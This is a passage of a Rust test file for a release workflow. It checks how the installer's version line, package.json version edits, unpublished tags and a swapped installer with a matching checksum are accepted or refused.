    });
    refused(
        &lab,
        "dev's own scripts/install.sh does not say ARCA_VERSION=0.1.0-alpha.7 at line 5",
    );

    // dev's own installer states its release in a way the check does not read.
    let lab = Lab::new("installer-quoted");
    lab.dev_changes("chore: quotes in the installer", |dev| {
        rewrite(
            dev,
            "scripts/install.sh",
            "ARCA_VERSION=0.1.0-alpha.7\n",
            "ARCA_VERSION=\"0.1.0-alpha.7\"\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "scripts/install.sh",
            "ARCA_VERSION=\"0.1.0-alpha.7\"\n",
            "ARCA_VERSION=0.1.0-alpha.7\n",
        );
        bump_by_hand(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own scripts/install.sh does not say ARCA_VERSION=0.1.0-alpha.7 at line 5",
    );

    // dev's own installer has two lines that state a release: nobody could say which one it installs.
    let lab = Lab::new("installer-two");
    lab.dev_changes("chore: a second version line", |dev| {
        rewrite(
            dev,
            "scripts/install.sh",
            "set -eu\n",
            "set -eu\nARCA_VERSION=0.0.1\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        bump_by_hand(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own scripts/install.sh does not have exactly one ARCA_VERSION line",
    );

    // dev's own installer has no such line at all.
    let lab = Lab::new("installer-none");
    lab.dev_changes("chore: no version line", |dev| {
        rewrite(
            dev,
            "scripts/install.sh",
            "ARCA_VERSION=0.1.0-alpha.7\n",
            "VERSION=0.1.0-alpha.7\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "scripts/install.sh",
            "VERSION=0.1.0-alpha.7\n",
            "ARCA_VERSION=0.1.0-alpha.7\n",
        );
        bump_by_hand(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own scripts/install.sh does not have exactly one ARCA_VERSION line",
    );
}

#[test]
fn a_package_json_whose_version_is_its_last_key_is_released_like_any_other() {
    let lab = Lab::new("lastkey");
    let package = "packages/arca-canvas-dsh/package.json";
    lab.dev_changes("chore: the version last", |dev| {
        put(
            dev,
            package,
            "{\n  \"name\": \"arca-canvas-dsh\",\n  \"scripts\": {\n    \"test\": \"node --test\"\n  },\n  \"version\": \"0.1.0-alpha.7\"\n}\n",
        )
    });
    // The repository's own script writes that shape, and the check reads it: no comma after the last key.
    lab.hand_over("0.8.0", "");
    let (publish, check) = lab.check("cut", "0.8.0");
    assert_eq!(check.code, Some(0), "{}", check.said);
    let commit = check.outputs.get("commit").expect("the commit").clone();
    assert!(
        git_at(&publish, &["show", &format!("{commit}:{package}")])
            .contains("  \"version\": \"0.8.0\"\n}")
    );
    // The same handover with the comma put in is a change to more than the number, and is refused.
    lab.hand_over_written("0.8.0", "", |cut| {
        lab.version_sh(cut, &["set", "0.8.0"]);
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
        rewrite(
            cut,
            package,
            "  \"version\": \"0.8.0\"\n",
            "  \"version\": \"0.8.0\",\n  \"x\": 1\n",
        );
    });
    let (_, more) = lab.check("cut", "0.8.0");
    assert_eq!(more.code, Some(1));
    assert!(
        more.said
            .contains("package.json changes something other than its version line")
    );
}

#[test]
fn a_tag_that_was_pushed_and_never_published_is_finished_and_nothing_new_is_cut() {
    let lab = Lab::new("finish");
    // An earlier run pushed the release commit and its tag, and its publishing failed.
    lab.hand_over("0.8.0", "");
    let cut = lab.dir().join("cut");
    git_at(
        &cut,
        &[
            "push",
            "-q",
            "--atomic",
            "origin",
            "HEAD:refs/heads/dev",
            "v0.8.0",
        ],
    );
    let released = lab.remote(&["rev-parse", "dev"]);
    // More landed since.
    lab.someone_pushes("crates/a/src/b.rs", "feat(a): after the tag");

    // The next run's plan: the tag has no release, so it is finished first.
    let plan = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(plan.code, Some(0), "{}", plan.said);
    assert_eq!(plan.outputs.get("mode").map(String::as_str), Some("finish"));
    assert_eq!(
        plan.outputs.get("version").map(String::as_str),
        Some("0.8.0")
    );
    assert!(!plan.outputs.contains_key("kind"), "nothing new is cut");
    // A draft is not a published release.
    lab.releases("v0.8.0 draft\nv0.1.0-alpha.7 published\n");
    let draft = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(
        draft.outputs.get("mode").map(String::as_str),
        Some("finish")
    );
    lab.releases("v0.1.0-alpha.7 published\n");

    // Its cutting job checks out the tag, builds, and hands over the files with no bundle, by the workflow's own step.
    let again = lab.clone_as("cut");
    git_at(&again, &["checkout", "-q", "--detach", "v0.8.0"]);
    lab.files(&again.join("dist"), "0.8.0", "");
    let handed = lab.step(
        "Hand over",
        &again,
        &[("MODE", "finish"), ("VERSION", "0.8.0")],
    );
    assert_eq!(handed.code, Some(0), "{}", handed.said);
    assert!(!again.join("handover/release.bundle").exists());
    let _ = fs::remove_dir_all(lab.temp());
    fs::create_dir_all(lab.temp()).expect("the temporary directory");
    fs::rename(again.join("handover"), lab.handed()).expect("the handover moves");

    // An installer that is not the tag's own is not published, though its checksum is true.
    lab.files(
        &lab.handed(),
        "0.8.0",
        "another installer under a true checksum",
    );
    let (_, forged) = lab.check("finish", "0.8.0");
    assert_eq!(forged.code, Some(1), "{}", forged.said);
    assert!(
        forged
            .said
            .contains("install.sh is not the release commit's scripts/install.sh"),
        "{}",
        forged.said
    );
    assert!(!forged.outputs.contains_key("commit"));
    lab.files(&lab.handed(), "0.8.0", "");

    // The publishing job pushes nothing and publishes the tag's commit.
    let (publish, check) = lab.check("finish", "0.8.0");
    assert_eq!(check.code, Some(0), "{}", check.said);
    assert_eq!(check.outputs.get("commit"), Some(&released));
    let done = lab.step(
        "Publish the release",
        &publish,
        &[
            ("VERSION", "0.8.0"),
            ("COMMIT", released.as_str()),
            ("PRERELEASE", "false"),
        ],
    );
    assert_eq!(done.code, Some(0), "{}", done.said);
    assert_eq!(done.outputs.get("sha"), Some(&released));
    assert!(lab.created().starts_with("release create v0.8.0 "));

    // Once it is published, the plan goes on to what landed after it.
    lab.releases("v0.8.0 published\nv0.1.0-alpha.7 published\n");
    let next = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(next.outputs.get("mode").map(String::as_str), Some("cut"));
    assert_eq!(next.outputs.get("kind").map(String::as_str), Some("full"));
    assert_eq!(next.outputs.get("last").map(String::as_str), Some("v0.8.0"));

    // A finish with a bundle beside the files, or for a tag the remote does not have, is refused.
    let (_, twice) = lab.check("finish", "0.8.0");
    assert_eq!(twice.code, Some(1));
    assert!(twice.said.contains("v0.8.0 is already published"));
    lab.releases("v0.1.0-alpha.7 published\n");
    fs::write(lab.handed().join("release.bundle"), "x").expect("write");
    let (_, bundled) = lab.check("finish", "0.8.0");
    assert_eq!(bundled.code, Some(1));
    assert!(
        bundled
            .said
            .contains("the handed-over files are not the expected ones")
    );
    let _ = fs::remove_dir_all(lab.handed());
    lab.files(&lab.handed(), "0.9.0", "");
    let (_, absent) = lab.check("finish", "0.9.0");
    assert_eq!(absent.code, Some(1));
    assert!(absent.said.contains("v0.9.0 is not on the remote"));
}

#[test]
fn the_plan_cuts_when_something_ships_and_does_nothing_when_nothing_does() {
    let lab = Lab::new("plan");
    let nothing = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(nothing.code, Some(0), "{}", nothing.said);
    assert_eq!(
        nothing.outputs.get("mode").map(String::as_str),
        Some("none")
    );

    lab.someone_pushes("docs/x.md", "docs: words");
    let inert = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(inert.outputs.get("mode").map(String::as_str), Some("none"));

    lab.someone_pushes("packages/arca-canvas-dsh/index.js", "feat(canvas): a card");
    let patch = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_eq!(patch.outputs.get("mode").map(String::as_str), Some("cut"));
    assert_eq!(patch.outputs.get("kind").map(String::as_str), Some("patch"));
    assert_eq!(
        patch.outputs.get("last").map(String::as_str),
        Some("v0.1.0-alpha.7")
    );

    // The list of releases must be read: when it cannot be, the run stops rather than guess.
    fs::remove_file(lab.dir().join("bin/releases.txt")).expect("remove");
    let unread = lab.step("What this run does", &lab.clone_as("plan"), &[]);
    assert_ne!(unread.code, Some(0));
    assert!(!unread.outputs.contains_key("mode"));
}
